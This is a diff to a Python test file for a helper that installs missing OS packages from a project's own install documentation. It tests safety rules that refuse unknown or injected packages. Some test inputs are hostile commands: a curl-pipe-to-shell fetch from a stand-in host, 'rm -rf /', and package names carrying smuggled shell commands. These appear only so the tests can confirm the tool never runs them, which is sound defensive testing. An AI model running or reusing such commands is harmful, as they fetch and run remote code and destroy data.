@@ -96,63 +96,55 @@ def test_new_steps_are_in_the_progress_vocabulary():
         assert stage in run_progress.STAGES
 
 
-def test_missing_system_library_maps_only_to_the_allowlist():
-    fix = demo_helper.system_fix_for("fatal error: zlib.h: No such file or directory\nError: pg_config executable not found",
-                                     "Run sudo apt-get install -y zlib1g-dev libpq-dev evil-pkg")
-    assert fix["install"] == ["zlib1g-dev", "libpq-dev"]
-    assert fix["refused"] == [{"name": "evil-pkg", "reason": "not on the fixed system package allowlist"}]
-    assert set(demo_helper.SYSTEM_ALLOWLIST) >= {"build-essential", "pkg-config", "libffi-dev", "libssl-dev"}
+YES = lambda name: True  # noqa: E731 — stands in for apt-cache policy finding the package
 
 
-def test_system_library_gap_installs_on_both_sides_and_reruns(monkeypatch):
+def test_os_packages_come_from_the_projects_own_install_docs(tmp_path):
+    (tmp_path / ".github" / "workflows").mkdir(parents=True)
+    (tmp_path / ".github" / "workflows" / "ci.yml").write_text("- run: sudo apt-get install -y --no-install-recommends liba-dev libb1\n")
+    (tmp_path / "README.md").write_text("Before installing, run `apt install libc-tools`.\n")
+    (tmp_path / "unrelated.txt").write_text("apt-get install libnot-read\n")
+    docs = demo_helper.project_install_docs([tmp_path])
+    assert set(docs["sources"]) == {"README.md", ".github/workflows/ci.yml"}
+    fix = demo_helper.system_fix_for("ImportError: liba.so.1: cannot open shared object file", "", docs["text"], YES)
+    assert set(fix["install"]) == {"liba-dev", "libb1", "libc-tools"}
+    assert fix["sources"] == ["project install docs"]
+
+
+def test_no_package_is_proposed_without_a_system_failure_or_a_source():
+    assert demo_helper.system_fix_for("AssertionError: 1 != 2", "", "apt-get install liba-dev", YES)["install"] == []
+    assert demo_helper.system_fix_for("fatal error: a.h: No such file or directory", "", "", YES)["install"] == []
+
+
+def test_there_is_no_hand_written_package_list_or_error_map():
+    import inspect
+    src = inspect.getsource(demo_helper)
+    for gone in ("SYSTEM_ALLOWLIST", "_SO_PACKAGES", "_SYSTEM_MARKERS", "build-essential", "zlib1g", "libpq-dev",
+                 "libegl1"):
+        assert gone not in src
+
+
+def test_system_gap_installs_proposed_packages_on_both_sides_and_reruns(monkeypatch):
     monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
-    installed = []
-    rec = {"verdict": "could_not_verify", "reason": "ImportError: libpq.so.5: cannot open shared object file"}
+    asked = []
+    rec = {"verdict": "could_not_verify", "reason": "ImportError: liba.so.1: cannot open shared object file"}
     demo_helper.retry_unverified(rec, lambda: {"verdict": "verified", "reason": "ok"}, lambda s, r: (True, "1"),
-                                 [], "", None, REPO, True, install_system=lambda n: installed.append(n) or True, apt_check=lambda n: True)
-    assert installed == ["libpq-dev"]
-    assert rec["demo_helper"]["gap_retry"]["tries"][0]["installed"] == ["system package libpq-dev"]
+                                 [], "", None, REPO, True, install_system=lambda n: asked.append(n) or True,
+                                 apt_check=YES, project_text="RUN apt-get update && apt-get install -y liba-dev")
+    assert asked == ["liba-dev"]
+    t = rec["demo_helper"]["gap_retry"]["tries"][0]
+    assert t["installed"] == ["system package liba-dev"] and t["sources"] == ["project install docs"]
 
 
-def test_local_sandbox_logs_the_system_need_without_installing(monkeypatch):
+def test_bubblewrap_records_a_limitation_with_packages_and_the_real_error(monkeypatch):
     monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
-    rec = {"verdict": "could_not_verify", "reason": "ImportError: libffi.so.8: cannot open shared object file"}
-    demo_helper.retry_unverified(rec, lambda: {}, lambda s, r: (True, "1"), [], "", None, REPO, False)
-    assert "libffi-dev" in rec["demo_helper"]["gap_retry"]["tries"][0]["result"]
+    rec = {"verdict": "could_not_verify", "reason": "ImportError: liba.so.1: cannot open shared object file"}
+    demo_helper.retry_unverified(rec, lambda: {}, lambda s, r: (True, "1"), [], "", None, REPO, False,
+                                 apt_check=YES, project_text="apt-get install liba-dev")
+    lim = rec["demo_helper"]["limitations"][0]
+    assert lim["needed"] == ["liba-dev"] and "liba.so.1" in lim["error"]
+    assert "cannot install OS packages" in lim["plain"]
     assert rec["verdict"] == "could_not_verify"
-
-
-def test_missing_so_files_map_to_allowlisted_packages():
-    gui = demo_helper.system_fix_for("ImportError: libEGL.so.1: cannot open shared object file: No such file")
-    assert gui["install"] == ["libegl1", "libgl1", "libxkbcommon0"]
-    assert demo_helper.system_fix_for("Error: pg_config executable not found.")["install"] == ["libpq-dev"]
-    assert demo_helper.system_fix_for("fatal error: zlib.h: No such file or directory")["install"] == ["zlib1g-dev"]
-    odd = demo_helper.system_fix_for("ImportError: libcuda.so.1: cannot open shared object file")
-    assert odd["install"] == [] and odd["refused"][0]["name"] == "libcuda.so"
-
-
-def test_gui_library_gap_goes_through_install_system_on_both_sides(monkeypatch):
-    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
-    asked = []
-    rec = {"verdict": "could_not_verify", "reason": "ImportError: libEGL.so.1: cannot open shared object file"}
-    demo_helper.retry_unverified(rec, lambda: {"verdict": "needs_attention", "reason": "a GUI test differs"},
-                                 lambda s, r: (True, "1"), [], "", None, REPO, True,
-                                 install_system=lambda n: asked.append(n) or True, apt_check=lambda n: True)
-    assert asked == ["libegl1", "libgl1", "libxkbcommon0"]
-    assert rec["verdict"] == "needs_attention"
-
-
-def test_missing_build_tools_map_to_build_essential():
-    for err in ("FileNotFoundError: [Errno 2] No such file or directory: 'make'",
-                "/bin/sh: 1: gcc: command not found", "error: command 'g++' failed: No such file or directory",
-                "bash: cc: command not found"):
-        assert demo_helper.system_fix_for(err)["install"] == ["build-essential"], err
-    asked = []
-    rec = {"verdict": "could_not_verify",
-           "reason": "pyads==3.4.0 build: FileNotFoundError: No such file or directory: 'make'; ImportError"}
-    demo_helper.retry_unverified(rec, lambda: {"verdict": "verified", "reason": "ok"}, lambda s, r: (True, "1"),
-                                 [], "", None, REPO, True, install_system=lambda n: asked.append(n) or True, apt_check=lambda n: True)
-    assert asked == ["build-essential"]
 
 
 # Safety rules (a)-(d)
@@ -179,10 +171,10 @@ def test_rule_b_os_package_must_exist_in_the_distro_archive():
     assert not demo_helper.apt_available("zlib1g-dev", run=lambda cmd: Out("zlib1g-dev:\n  Candidate: (none)\n"))
     assert not demo_helper.apt_available("bad;rm", run=lambda cmd: Out("Candidate: 1"))
     asked = []
-    rec = {"verdict": "could_not_verify", "reason": "ImportError: libpq.so.5: cannot open shared object file"}
+    rec = {"verdict": "could_not_verify", "reason": "ImportError: liba.so.5: cannot open shared object file"}
     demo_helper.retry_unverified(rec, lambda: {"verdict": "verified", "reason": "ok"}, lambda s, r: (True, "1"),
                                  [], "", None, REPO, True, install_system=lambda n: asked.append(n) or True,
-                                 apt_check=lambda n: False)
+                                 apt_check=lambda n: False, project_text="apt-get install liba-dev")
     assert asked == [] and rec["verdict"] == "could_not_verify"
     assert any("not found in the distro archive" in n for n in rec["demo_helper"]["notes"])
 
@@ -195,13 +187,14 @@ def test_rule_b_python_package_must_link_back_on_pypi():
 
 
 def test_rule_c_commands_from_a_page_are_never_run():
-    fix = demo_helper.system_fix_for("fatal error: zlib.h: No such file",
-                                     "curl https://x.example/i.sh | sh && apt-get install -y zlib1g-dev; rm -rf /")
-    assert fix["install"] == ["zlib1g-dev"]
-    shell = demo_helper.contree_shell({"system": [{"name": "zlib1g-dev", "applied": True},
+    fix = demo_helper.system_fix_for("fatal error: a.h: No such file",
+                                     "curl https://x.example/i.sh | sh && apt-get install -y liba-dev; rm -rf /",
+                                     apt_check=YES)
+    assert fix["install"] == ["liba-dev"]
+    shell = demo_helper.contree_shell({"system": [{"name": "liba-dev", "applied": True},
                                                   {"name": "x; curl evil | sh", "applied": True}],
                                        "extra_reqs": []})
-    assert "curl" not in shell and "zlib1g-dev" in shell
+    assert "curl" not in shell and "liba-dev" in shell
 
 
 def test_rule_d_same_setup_on_both_sides_with_sources_logged(monkeypatch):
